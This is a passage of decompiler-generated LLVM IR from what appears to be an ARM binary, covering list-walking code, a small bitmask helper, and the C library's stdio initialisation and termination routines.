  %v3_15ac0 = load i32, i32* %v2_15ac0, align 4
  store i32 %v3_15ac0, i32* %r3.global-to-local, align 4
  %v1_15ac4 = inttoptr i32 %v4_15abc to i32*
  %v2_15ac4 = load i32, i32* %v1_15ac4, align 4
  store i32 %v2_15ac4, i32* %r2.global-to-local, align 4
  %v1_15ac8 = add i32 %v3_15ac0, 1
  store i32 %v1_15ac8, i32* %r3.global-to-local, align 4
  store i32 %v1_15ac8, i32* %v2_15ac0, align 4
  %v0_15ad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ad0 = load i32, i32* @r5, align 4
  %v2_15ad0 = add i32 %v1_15ad0, 32
  %v3_15ad0 = inttoptr i32 %v2_15ad0 to i32*
  store i32 %v0_15ad0, i32* %v3_15ad0, align 4
  %v0_15ad4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15ad4 = add i32 %v0_15ad4, 4
  %v2_15ad4 = inttoptr i32 %v1_15ad4 to i32*
  %v3_15ad4 = load i32, i32* %v2_15ad4, align 4
  %v1_15ad8 = add i32 %v3_15ad4, -1
  store i32 %v1_15ad8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15adc = icmp eq i32 %v1_15ad8, 0
  %v0_15ae0 = load i32, i32* @r5, align 4
  %v1_15ae0 = load i32, i32* @r1, align 4
  %v2_15ae0 = inttoptr i32 %v1_15ae0 to i32*
  store i32 %v0_15ae0, i32* %v2_15ae0, align 4
  %v0_15ae4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15ae4 = load i32, i32* %r0.global-to-local, align 4
  %v2_15ae4 = add i32 %v1_15ae4, 4
  %v3_15ae4 = inttoptr i32 %v2_15ae4 to i32*
  store i32 %v0_15ae4, i32* %v3_15ae4, align 4
  br i1 %v2_15adc, label %dec_label_pc_15aec, label %dec_label_pc_15b4c

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15ab0
  %v0_15aec = load i32, i32* %r3.global-to-local, align 4
  %v1_15aec = load i32, i32* %r0.global-to-local, align 4
  %v2_15aec = add i32 %v1_15aec, 8
  %v3_15aec = inttoptr i32 %v2_15aec to i32*
  store i32 %v0_15aec, i32* %v3_15aec, align 4
  %v0_15af0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15af0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15b24.dec_label_pc_15af4_crit_edge, %dec_label_pc_15aec
  %v0_15af4 = phi i32 [ %v0_15af4.pre, %dec_label_pc_15b24.dec_label_pc_15af4_crit_edge ], [ %v0_15af0, %dec_label_pc_15aec ]
  %v1_15af4 = inttoptr i32 %v0_15af4 to i32*
  %v2_15af4 = load i32, i32* %v1_15af4, align 4
  store i32 %v2_15af4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15af4, i32* %r2.global-to-local, align 4
  %v2_15b0083 = load i32, i32* %v1_15af4, align 4
  store i32 %v2_15b0083, i32* %r3.global-to-local, align 4
  %v3_15b0485 = icmp uge i32 %v2_15b0083, %v2_15af4
  store i1 %v3_15b0485, i1* %cpsr_c.global-to-local, align 1
  %v9_15b0491 = icmp eq i32 %v2_15b0083, %v2_15af4
  br i1 %v9_15b0491, label %dec_label_pc_15b0c, label %dec_label_pc_15b24

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15af4, %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge
  %v0_15b0c92 = phi i32 [ %v1_15b04.pre, %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge ], [ %v2_15af4, %dec_label_pc_15af4 ]
  store i32 %v0_15b0c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15b1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15b1c, label %dec_label_pc_15b20, label %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge

dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge:  ; preds = %dec_label_pc_15b0c
  %v0_15b00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15b04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15b00 = inttoptr i32 %v0_15b00.pre to i32*
  %v2_15b00 = load i32, i32* %v1_15b00, align 4
  store i32 %v2_15b00, i32* %r3.global-to-local, align 4
  %v3_15b04 = icmp uge i32 %v2_15b00, %v1_15b04.pre
  store i1 %v3_15b04, i1* %cpsr_c.global-to-local, align 1
  %v9_15b04 = icmp eq i32 %v2_15b00, %v1_15b04.pre
  br i1 %v9_15b04, label %dec_label_pc_15b0c, label %dec_label_pc_15b24

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b0c
  %v0_15b20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15b20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15af4, %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge, %dec_label_pc_15b20
  %v0_15b2c = phi i32 [ %v0_15b20, %dec_label_pc_15b20 ], [ %v2_15b0083, %dec_label_pc_15af4 ], [ %v2_15b00, %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge ]
  %v1_15b24 = phi i32 [ %v0_15b20, %dec_label_pc_15b20 ], [ %v2_15af4, %dec_label_pc_15af4 ], [ %v1_15b04.pre, %dec_label_pc_15b0c.dec_label_pc_15b00_crit_edge ]
  %v3_15b24 = icmp uge i32 %v0_15b2c, %v1_15b24
  store i1 %v3_15b24, i1* %cpsr_c.global-to-local, align 1
  %v9_15b24 = icmp eq i32 %v0_15b2c, %v1_15b24
  br i1 %v9_15b24, label %dec_label_pc_15b2c, label %dec_label_pc_15b24.dec_label_pc_15af4_crit_edge

dec_label_pc_15b24.dec_label_pc_15af4_crit_edge:  ; preds = %dec_label_pc_15b24
  %v0_15af4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15af4

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b24
  %v2_15b2c = icmp ne i32 %v1_15b24, 0
  store i1 %v2_15b2c, i1* %cpsr_c.global-to-local, align 1
  %v7_15b30 = icmp slt i32 %v1_15b24, 2
  br i1 %v7_15b30, label %dec_label_pc_15b4c, label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b2c
  %v0_15b34 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15b34, i32* %r0.global-to-local, align 4
  %v0_15b38 = load i32, i32* @r1, align 4
  %v1_15b38 = add i32 %v0_15b38, 129
  store i32 %v1_15b38, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_15b4c:                               ; preds = %dec_label_pc_15ab0, %dec_label_pc_15b34, %dec_label_pc_15b2c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15b50 = load i32, i32* @r8, align 4
  %v2_15b50 = add i32 %v0_15b50, 160
  %v3_15b50 = inttoptr i32 %v2_15b50 to i32*
  %v4_15b50 = load i32, i32* %v3_15b50, align 4
  store i32 %v4_15b50, i32* %r0.global-to-local, align 4
  %v1_15b54 = add i32 %v4_15b50, 4
  %v2_15b54 = inttoptr i32 %v1_15b54 to i32*
  %v3_15b54 = load i32, i32* %v2_15b54, align 4
  %v1_15b58 = add i32 %v3_15b54, -1
  store i32 %v1_15b58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b5c = icmp eq i32 %v1_15b58, 0
  store i32 %v1_15b58, i32* %v2_15b54, align 4
  br i1 %v2_15b5c, label %dec_label_pc_15b68, label %dec_label_pc_15bd0

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15b4c
  %v0_15b68 = load i32, i32* %r3.global-to-local, align 4
  %v1_15b68 = load i32, i32* %r0.global-to-local, align 4
  %v2_15b68 = add i32 %v1_15b68, 8
  %v3_15b68 = inttoptr i32 %v2_15b68 to i32*
  store i32 %v0_15b68, i32* %v3_15b68, align 4
  %v0_15b6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15b6c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15ba0.dec_label_pc_15b70_crit_edge, %dec_label_pc_15b68
  %v0_15b70 = phi i32 [ %v0_15b70.pre, %dec_label_pc_15ba0.dec_label_pc_15b70_crit_edge ], [ %v0_15b6c, %dec_label_pc_15b68 ]
  %v1_15b70 = inttoptr i32 %v0_15b70 to i32*
  %v2_15b70 = load i32, i32* %v1_15b70, align 4
  store i32 %v2_15b70, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15b70, i32* %r2.global-to-local, align 4
  %v2_15b7c71 = load i32, i32* %v1_15b70, align 4
  store i32 %v2_15b7c71, i32* %r3.global-to-local, align 4
  %v3_15b8073 = icmp uge i32 %v2_15b7c71, %v2_15b70
  store i1 %v3_15b8073, i1* %cpsr_c.global-to-local, align 1
  %v9_15b8079 = icmp eq i32 %v2_15b7c71, %v2_15b70
  br i1 %v9_15b8079, label %dec_label_pc_15b88, label %dec_label_pc_15ba0

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b70, %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge
  %v0_15b8880 = phi i32 [ %v1_15b80.pre, %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge ], [ %v2_15b70, %dec_label_pc_15b70 ]
  store i32 %v0_15b8880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15b98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15b98, label %dec_label_pc_15b9c, label %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge

dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge:  ; preds = %dec_label_pc_15b88
  %v0_15b7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15b80.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15b7c = inttoptr i32 %v0_15b7c.pre to i32*
  %v2_15b7c = load i32, i32* %v1_15b7c, align 4
  store i32 %v2_15b7c, i32* %r3.global-to-local, align 4
  %v3_15b80 = icmp uge i32 %v2_15b7c, %v1_15b80.pre
  store i1 %v3_15b80, i1* %cpsr_c.global-to-local, align 1
  %v9_15b80 = icmp eq i32 %v2_15b7c, %v1_15b80.pre
  br i1 %v9_15b80, label %dec_label_pc_15b88, label %dec_label_pc_15ba0

dec_label_pc_15b9c:                               ; preds = %dec_label_pc_15b88
  %v0_15b9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15b9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ba0

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15b70, %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge, %dec_label_pc_15b9c
  %v0_15ba8 = phi i32 [ %v0_15b9c, %dec_label_pc_15b9c ], [ %v2_15b7c71, %dec_label_pc_15b70 ], [ %v2_15b7c, %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge ]
  %v1_15ba0 = phi i32 [ %v0_15b9c, %dec_label_pc_15b9c ], [ %v2_15b70, %dec_label_pc_15b70 ], [ %v1_15b80.pre, %dec_label_pc_15b88.dec_label_pc_15b7c_crit_edge ]
  %v3_15ba0 = icmp uge i32 %v0_15ba8, %v1_15ba0
  store i1 %v3_15ba0, i1* %cpsr_c.global-to-local, align 1
  %v9_15ba0 = icmp eq i32 %v0_15ba8, %v1_15ba0
  br i1 %v9_15ba0, label %dec_label_pc_15ba8, label %dec_label_pc_15ba0.dec_label_pc_15b70_crit_edge

dec_label_pc_15ba0.dec_label_pc_15b70_crit_edge:  ; preds = %dec_label_pc_15ba0
  %v0_15b70.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15b70

dec_label_pc_15ba8:                               ; preds = %dec_label_pc_15ba0
  %v2_15ba8 = icmp ne i32 %v1_15ba0, 0
  store i1 %v2_15ba8, i1* %cpsr_c.global-to-local, align 1
  %v7_15bac = icmp slt i32 %v1_15ba0, 2
  br i1 %v7_15bac, label %dec_label_pc_15bd0, label %dec_label_pc_15bb0

dec_label_pc_15bb0:                               ; preds = %dec_label_pc_15ba8
  %v0_15bb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15bb0, i32* %r0.global-to-local, align 4
  %v0_15bb4 = load i32, i32* @r1, align 4
  %v1_15bb4 = add i32 %v0_15bb4, 129
  store i32 %v1_15bb4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15bd0

dec_label_pc_15bcc:                               ; preds = %dec_label_pc_15810, %dec_label_pc_157f4, %dec_label_pc_1581c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15b4c, %dec_label_pc_15ba8, %bb57, %dec_label_pc_15854, %dec_label_pc_15bb0, %dec_label_pc_15bcc
  %v0_15bd0 = load i32, i32* @r5, align 4
  store i32 %v0_15bd0, i32* %r0.global-to-local, align 4
  %v2_15bd8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15bd8, i32* %r4.global-to-local, align 4
  store i32 %v6_157b4, i32* @r5, align 4
  store i32 %v9_157b4, i32* @r6, align 4
  store i32 %v12_157b4, i32* @r7, align 4
  store i32 %v15_157b4, i32* @r8, align 4
  ret i32 %v0_15bd0

; uselistorder directives
  uselistorder i32 %v0_15b9c, { 1, 0, 2 }
  uselistorder i32 %v1_15b80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15b70, { 1, 0 }
  uselistorder i32 %v0_15b20, { 1, 0, 2 }
  uselistorder i32 %v1_15b04.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15af4, { 1, 0 }
  uselistorder i32 %v0_15a9c, { 1, 0, 2 }
  uselistorder i32 %v1_15a80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15a34, { 1, 0, 2 }
  uselistorder i32 %v1_15a18, { 0, 2, 1 }
  uselistorder i32 %v4_159f4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_159a4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_15928, { 1, 2, 0 }
  uselistorder i32 %v1_158b8, { 1, 0 }
  uselistorder i32 %v0_158b8, { 1, 0 }
  uselistorder i32 %v1_158a0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15844, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 67, 68, 0, 69, 1, 38, 70, 39, 71, 40, 72, 41, 73, 42, 74, 43, 75, 19, 76, 18, 61, 4, 51, 36, 52, 5, 53, 37, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 11, 60, 35, 62, 12, 63, 13, 64, 14, 65, 15, 66, 44, 77, 16, 78, 17, 79, 80, 47, 81, 48, 82, 21, 83, 45, 84, 20, 85, 46, 86, 22, 87, 23, 88, 25, 89, 24, 90, 27, 91, 26, 92, 28, 93, 29, 94, 30, 95, 31, 96, 32, 97, 49, 98, 33, 2, 50, 99, 34, 3 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 12, 11, 2, 1, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 (i32)* @malloc, { 34, 33, 32, 4, 3, 2, 0, 1, 7, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_15bd0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15bcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ba0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b88, { 1, 0 }
  uselistorder label %dec_label_pc_15b4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15b24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b0c, { 1, 0 }
  uselistorder label %dec_label_pc_15ab0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_15aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a88, { 1, 0 }
  uselistorder label %dec_label_pc_15a48, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_15a38, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15980, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_158e8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15890, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1582c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_157f4, { 1, 2, 0 }
}

define i32 @function_15be4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15be4:
  %v0_15be4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15be4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15be4
  %v5_15be4 = sdiv i32 %arg2, 16
  %v6_15be4 = and i32 %v5_15be4, %arg1
  %v5_15be8 = sdiv i32 %arg2, 256
  %v6_15be8 = and i32 %v6_15be4, %v5_15be8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15be4, %bb
  %v9_15bec = phi i32 [ %arg1, %dec_label_pc_15be4 ], [ %v6_15be8, %bb ]
  ret i32 %v9_15bec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_15c1c = call i32 @__aeabi_read_tp()
  %v3_15c20 = load i16, i16* @global_var_216ec.303, align 2
  %v4_15c20 = sext i16 %v3_15c20 to i32
  store i32 %v4_15c20, i32* @r3, align 4
  store i32 %v0_15c1c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_15c2c = add i32 %v4_15c20, %v0_15c1c
  %v3_15c2c = inttoptr i32 %v2_15c2c to i32*
  %v4_15c2c = load i32, i32* %v3_15c2c, align 4
  store i32 %v4_15c2c, i32* @r6, align 4
  %v1_15c30 = call i32 @isatty(i32 0)
  %v2_15c38 = icmp eq i32 %v1_15c30, 0
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r4, align 4
  br i1 %v2_15c38, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_15c44 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 308) to i16*), align 4
  %v7_15c44 = zext i16 %v5_15c44 to i32
  %v2_15c48 = xor i32 %v7_15c44, 256
  store i32 %v2_15c48, i32* @r3, align 4
  %v2_15c4c = trunc i32 %v2_15c48 to i16
  store i16 %v2_15c4c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_15c54 = call i32 @isatty(i32 1)
  %v2_15c58 = icmp eq i32 %v1_15c54, 0
  br i1 %v2_15c58, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_15c60 = load i32, i32* @r4, align 4
  %v2_15c64 = add i32 %v1_15c60, 376
  %v3_15c64 = inttoptr i32 %v2_15c64 to i16*
  %v4_15c64 = load i16, i16* %v3_15c64, align 2
  %v2_15c68 = xor i16 %v4_15c64, 256
  store i16 %v2_15c68, i16* %v3_15c64, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_15c74 = load i16, i16* @global_var_216ec.303, align 2
  %v4_15c74 = sext i16 %v3_15c74 to i32
  %v0_15c78 = load i32, i32* @r6, align 4
  %v1_15c78 = load i32, i32* @r5, align 4
  %v3_15c78 = add i32 %v1_15c78, %v4_15c74
  %v4_15c78 = inttoptr i32 %v3_15c78 to i32*
  store i32 %v0_15c78, i32* %v4_15c78, align 4
  ret i32 %v1_15c54

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15c94 = load i32, i32* @r4, align 4
  store i32 %v3_15c94, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_15ca8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_15ca8, i32* %r0.global-to-local, align 4
  %v5_15ca8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_15ca8, i32* %r1.global-to-local, align 4
  %v8_15ca8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33092) to i32*), align 4
  %v2_15cb0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15cb0, i32* %r3.global-to-local, align 4
  store i32 %v2_15ca8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_15cbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 152) to i32*), align 4
  store i32 %v2_15ca8, i32* %r0.global-to-local, align 4
  store i32 %v5_15ca8, i32* %r1.global-to-local, align 4
  store i32 %v8_15ca8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_15ccc = inttoptr i32 %v4_15cbc to i32*
  store i32 %v2_15ca8, i32* %v1_15ccc, align 4
  %v3_15ccc = add i32 %v4_15cbc, 4
  %v4_15ccc = inttoptr i32 %v3_15ccc to i32*
  %v5_15ccc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15ccc, i32* %v4_15ccc, align 4
  %v6_15ccc = add i32 %v4_15cbc, 8
  %v7_15ccc = inttoptr i32 %v6_15ccc to i32*
  %v8_15ccc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15ccc, i32* %v7_15ccc, align 4
  %v0_15cd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_15cd0 = inttoptr i32 %v0_15cd0 to i32*
  %v2_15cd0 = load i32, i32* %v1_15cd0, align 4
  store i32 %v2_15cd0, i32* %r0.global-to-local, align 4
  %v3_15cd0 = add i32 %v0_15cd0, 4
  %v4_15cd0 = inttoptr i32 %v3_15cd0 to i32*
  %v5_15cd0 = load i32, i32* %v4_15cd0, align 4
  store i32 %v5_15cd0, i32* %r1.global-to-local, align 4
  %v6_15cd0 = add i32 %v0_15cd0, 8
  %v7_15cd0 = inttoptr i32 %v6_15cd0 to i32*
  %v8_15cd0 = load i32, i32* %v7_15cd0, align 4
  %v2_15cd4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15cd4, i32* %r3.global-to-local, align 4
  store i32 %v2_15cd0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_15ce0 = load i32, i32* %r7.global-to-local, align 4
  %v2_15ce0 = add i32 %v0_15ce0, 76
  %v3_15ce0 = inttoptr i32 %v2_15ce0 to i32*
  %v4_15ce0 = load i32, i32* %v3_15ce0, align 4
  store i32 %v4_15ce0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_15ce8 = inttoptr i32 %v4_15ce0 to i32*
  %v2_15ce8 = load i32, i32* %v1_15ce8, align 4
  store i32 %v2_15ce8, i32* %r5.global-to-local, align 4
  %v2_15cec = add i32 %v0_15ce0, 160
  %v3_15cec = inttoptr i32 %v2_15cec to i32*
  %v4_15cec = load i32, i32* %v3_15cec, align 4
  store i32 %v2_15cd0, i32* %r0.global-to-local, align 4
  store i32 %v5_15cd0, i32* %r1.global-to-local, align 4
  store i32 %v8_15cd0, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_15cfc = add i32 %v0_15ce0, -33124
  store i32 %v2_15cfc, i32* %sl.global-to-local, align 4
  %v1_15d00 = inttoptr i32 %v4_15cec to i32*
  store i32 %v2_15cd0, i32* %v1_15d00, align 4
  %v3_15d00 = add i32 %v4_15cec, 4
  %v4_15d00 = inttoptr i32 %v3_15d00 to i32*
  %v5_15d00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15d00, i32* %v4_15d00, align 4
  %v6_15d00 = add i32 %v4_15cec, 8
  %v7_15d00 = inttoptr i32 %v6_15d00 to i32*
  %v8_15d00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15d00, i32* %v7_15d00, align 4
  %v0_15d90.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d9016 = icmp eq i32 %v0_15d90.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15d9818 = add i32 %v0_15d90.pr, 56
  store i32 %v1_15d9818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15d9016, label %dec_label_pc_15da4, label %dec_label_pc_15d08

dec_label_pc_15d08:                               ; preds = %entry, %.thread10
  %v0_15d08 = phi i32 [ %v3_15d8c, %.thread10 ], [ %v0_15d90.pr, %entry ]
  %v1_15d08 = add i32 %v0_15d08, 64
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  %v3_15d08 = load i32, i32* %v2_15d08, align 4
  store i32 %v3_15d08, i32* %r3.global-to-local, align 4
  %v0_15d0c = call i32 @__aeabi_read_tp()
  store i32 %v0_15d0c, i32* %r0.global-to-local, align 4
  %v1_15d10 = add i32 %v0_15d0c, -1168
  store i32 %v1_15d10, i32* %r6.global-to-local, align 4
  %v3_15d14 = icmp uge i32 %v3_15d08, %v1_15d10
  store i1 %v3_15d14, i1* %cpsr_c.global-to-local, align 1
  %v9_15d14 = icmp eq i32 %v3_15d08, %v1_15d10
  br i1 %v9_15d14, label %.thread1, label %dec_label_pc_15d28

.thread1:                                         ; preds = %dec_label_pc_15d08
  %v1_15d18 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d18 = add i32 %v1_15d18, 60
  %v3_15d18 = inttoptr i32 %v2_15d18 to i32*
  %v4_15d18 = load i32, i32* %v3_15d18, align 4
  %v2_15d1c = add i32 %v4_15d18, 1
  store i32 %v2_15d1c, i32* %r3.global-to-local, align 4
  store i32 %v2_15d1c, i32* %v3_15d18, align 4
  br label %.thread10

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d08, %dec_label_pc_15d34
  %v0_15d28 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d28 = inttoptr i32 %v0_15d28 to i32*
  %v2_15d28 = load i32, i32* %v1_15d28, align 4
  store i32 %v2_15d28, i32* %r3.global-to-local, align 4
  %v1_15d2c = load i32, i32* %r4.global-to-local, align 4
  %v3_15d2c = icmp uge i32 %v2_15d28, %v1_15d2c
  store i1 %v3_15d2c, i1* %cpsr_c.global-to-local, align 1
  %v9_15d2c = icmp eq i32 %v2_15d28, %v1_15d2c
